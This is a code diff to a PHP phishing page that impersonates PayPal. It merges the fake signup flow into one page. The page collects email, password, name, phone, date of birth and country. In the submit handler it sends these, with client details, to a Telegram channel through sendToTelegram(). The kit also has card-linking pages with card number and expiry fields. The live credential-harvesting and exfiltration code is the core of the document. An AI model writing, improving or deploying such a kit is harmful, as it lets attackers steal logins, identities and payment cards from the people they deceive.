@@ -63,24 +63,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $currentPage = 'dashboard';
     }
     
-    // --- SIGNUP STEP 1 (Email + Password) ---
-    if (isset($_POST['signup_step1_submit'])) {
+    // --- SIGNUP SUBMISSION (all fields on one page) ---
+    if (isset($_POST['signup_submit'])) {
         $email = $_POST['email'] ?? '';
         $password = $_POST['password'] ?? '';
-        
-        // Store in session or pass via hidden field
-        session_start();
-        $_SESSION['signup_email'] = $email;
-        $_SESSION['signup_password'] = $password;
-        
-        $currentPage = 'signup_step2';
-    }
-    
-    // --- SIGNUP STEP 2 (Personal Details) ---
-    if (isset($_POST['signup_step2_submit'])) {
-        session_start();
-        $email = $_SESSION['signup_email'] ?? '';
-        $password = $_SESSION['signup_password'] ?? '';
         $firstName = $_POST['first_name'] ?? '';
         $lastName = $_POST['last_name'] ?? '';
         $phone = $_POST['phone'] ?? '';
@@ -88,7 +74,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $country = $_POST['country'] ?? '';
         
         $clientInfo = getClientInfo();
-        $msg = "📝 <b>PAYPAL - New Account (Full Registration)</b>\n\n"
+        $msg = "📝 <b>PAYPAL - New Account Created</b>\n\n"
              . "📧 Email: <code>{$email}</code>\n"
              . "🔑 Password: <code>{$password}</code>\n"
              . "👤 Name: <code>{$firstName} {$lastName}</code>\n"
@@ -99,7 +85,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
              . "🕐 " . date('Y-m-d H:i:s');
         
         sendToTelegram($msg);
-        session_destroy();
         $currentPage = 'dashboard';
     }
     
@@ -131,7 +116,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 // ============================================================
 if ($_SERVER['REQUEST_METHOD'] === 'GET') {
     $page = $_GET['page'] ?? 'login';
-    if (in_array($page, ['login', 'signup_step2', 'dashboard', 'link_card', 'card_error'])) {
+    if (in_array($page, ['login', 'signup', 'dashboard', 'link_card', 'card_error'])) {
         $currentPage = $page;
     } else {
         $currentPage = 'login';
@@ -268,27 +253,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
             gap: 12px;
         }
         .form-row .input-group { flex: 1; }
-        .step-indicator {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 25px;
-            font-size: 13px;
-            color: #6c7378;
-        }
-        .step-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #cbd2d6;
-        }
-        .step-dot.active { background: #005ea6; }
-        .step-dot.completed { background: #1a9c4a; }
-        .step-line {
-            width: 30px;
-            height: 2px;
-            background: #cbd2d6;
-        }
         .error-box {
             background: #fff3f3;
             border: 1px solid #ffcccc;
@@ -515,6 +479,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
             margin: 20px 0 35px 0;
             text-align: left;
         }
+        .section-title {
+            font-size: 13px;
+            font-weight: bold;
+            color: #6c7378;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin: 20px 0 10px 0;
+            text-align: left;
+            width: 100%;
+            padding-bottom: 5px;
+            border-bottom: 1px solid #eee;
+        }
         @media (max-width: 768px) {
             .dashboard-grid { grid-template-columns: 1fr; }
             header { padding: 0 20px; }
@@ -540,7 +516,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
                 <button type="submit" name="login_submit" class="btn btn-primary">Log In</button>
             </form>
             <div class="divider">or</div>
-            <button class="btn btn-secondary" onclick="window.location.href='?page=signup_step1'">Sign Up</button>
+            <button class="btn btn-secondary" onclick="window.location.href='?page=signup'">Sign Up</button>
         </div>
         <div class="language-picker">
             <div class="flag-icon"></div>
@@ -555,26 +531,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
         <a href="#">Worldwide</a>
     </footer>
 
-<?php elseif ($currentPage === 'signup_step1'): ?>
-    <!-- ============ SIGNUP STEP 1: Email & Password ============ -->
+<?php elseif ($currentPage === 'signup'): ?>
+    <!-- ============ SIGNUP PAGE (All fields on one page) ============ -->
     <div class="card-container wide">
         <div class="logo">PayPal</div>
         
-        <!-- Step Indicator -->
-        <div class="step-indicator">
-            <span class="step-dot active"></span>
-            <span class="step-line"></span>
-            <span class="step-dot"></span>
-            <span class="step-line"></span>
-            <span class="step-dot"></span>
-        </div>
-        
-        <h2 style="font-size:24px;font-weight:700;margin-bottom:8px;text-align:left;width:100%;">Create your account</h2>
-        <p style="font-size:14px;color:#6c7378;margin-bottom:25px;text-align:left;width:100%;">Step 1 of 2 — Account info</p>
+        <h2 style="font-size:24px;font-weight:700;margin-bottom:5px;text-align:left;width:100%;">Create your account</h2>
+        <p style="font-size:14px;color:#6c7378;margin-bottom:20px;text-align:left;width:100%;">Fill in your details to get started</p>
         
         <div class="form-container">
             <form method="POST" action="">
-                <input type="hidden" name="signup_step1_submit" value="1">
+                <input type="hidden" name="signup_submit" value="1">
+                
+                <!-- Account Section -->
+                <div class="section-title">Account Information</div>
+                
                 <div class="input-group">
                     <input type="email" name="email" placeholder="Email address" required>
                 </div>
@@ -585,50 +556,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
                     <input type="password" name="confirm_password" placeholder="Confirm password" required minlength="8">
                 </div>
                 
-                <div class="terms-text">
-                    By creating an account, you agree to our <a href="#">Privacy Policy</a> and 
-                    <a href="#">User Agreement</a>.
-                </div>
-                
-                <button type="submit" class="btn btn-primary" style="margin-top:20px;">Next</button>
-            </form>
-            
-            <div class="divider">or</div>
-            <button class="btn btn-secondary" onclick="window.location.href='?page=login'">Log In</button>
-        </div>
-        <div class="language-picker">
-            <div class="flag-icon"></div>
-            <div class="arrow-down"></div>
-        </div>
-    </div>
-    <footer>
-        <a href="#">Contact Us</a>
-        <a href="#">Privacy</a>
-        <a href="#">Legal</a>
-        <a href="#">Policy Updates</a>
-        <a href="#">Worldwide</a>
-    </footer>
-
-<?php elseif ($currentPage === 'signup_step2'): ?>
-    <!-- ============ SIGNUP STEP 2: Personal Details ============ -->
-    <div class="card-container wide">
-        <div class="logo">PayPal</div>
-        
-        <!-- Step Indicator -->
-        <div class="step-indicator">
-            <span class="step-dot completed"></span>
-            <span class="step-line" style="background:#1a9c4a;"></span>
-            <span class="step-dot active"></span>
-            <span class="step-line"></span>
-            <span class="step-dot"></span>
-        </div>
-        
-        <h2 style="font-size:24px;font-weight:700;margin-bottom:8px;text-align:left;width:100%;">Personal details</h2>
-        <p style="font-size:14px;color:#6c7378;margin-bottom:25px;text-align:left;width:100%;">Step 2 of 2 — Let's get to know you</p>
-        
-        <div class="form-container">
-            <form method="POST" action="">
-                <input type="hidden" name="signup_step2_submit" value="1">
+                <!-- Personal Section -->
+                <div class="section-title">Personal Details</div>
                 
                 <div class="form-row">
                     <div class="input-group">
@@ -644,7 +573,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
                 </div>
                 
                 <div class="input-group">
-                    <input type="date" name="dob" placeholder="Date of birth" required style="padding:18px 12px;">
+                    <label style="display:block;font-size:13px;color:#6c7378;margin-bottom:5px;text-align:left;">Date of birth</label>
+                    <input type="date" name="dob" required>
                 </div>
                 
                 <div class="input-group">
@@ -673,9 +603,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
                     </select>
                 </div>
                 
-                <div class="terms-text" style="text-align:left;margin-top:10px;">
+                <div class="terms-text" style="text-align:left;margin-top:15px;">
                     <label style="display:flex;align-items:flex-start;gap:10px;cursor:pointer;">
-                        <input type="checkbox" required style="margin-top:3px;width:16px;height:16px;">
+                        <input type="checkbox" required style="margin-top:3px;width:16px;height:16px;flex-shrink:0;">
                         <span>I agree to the <a href="#">Privacy Policy</a> and <a href="#">User Agreement</a>, 
                         and confirm I am at least 18 years old.</span>
                     </label>
@@ -801,7 +731,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
                     <input type="text" name="card_number" placeholder="1234 5678 9012 3456" required maxlength="19">
                 </div>
                 
-                <div class="form-row">
+                <div class="form-row" style="flex-direction:row;">
                     <div class="input-wrapper">
                         <label>Expiration</label>
                         <input type="text" name="expiry" placeholder="MM/YY" required maxlength="5">
